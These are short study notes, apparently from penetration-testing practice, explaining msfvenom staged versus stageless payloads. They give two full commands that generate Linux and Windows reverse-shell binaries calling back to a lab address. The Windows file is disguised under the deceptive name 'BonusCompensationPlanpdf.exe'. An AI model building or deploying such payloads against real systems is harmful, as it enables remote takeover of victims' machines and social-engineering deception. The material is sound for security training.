# Practicing MSFvenom
`msfvenom -l payloads` Will list the payloads available
At first it will start off with the OS as the first directory

### Staged Payloads
This will send a bit of the payload to connect then it will call back to the attacker box to get the rest of the payload

### Stageless Payloads
This will run the attack (less traffic over the network)

Building the stageless payload
````shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
````
Using the -p is the payload option
Using the linux/x64/shell_reverse_tcp is the architure
Then Listing the addresses of Lport etc will give it the information it needs to run
The -f elf is formatting of the payload
And finally the '>' createbackup.elf creates the binary for the file backup

```Windows
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
But the odds are that the AV software will catch the file before it can fully download to the system.
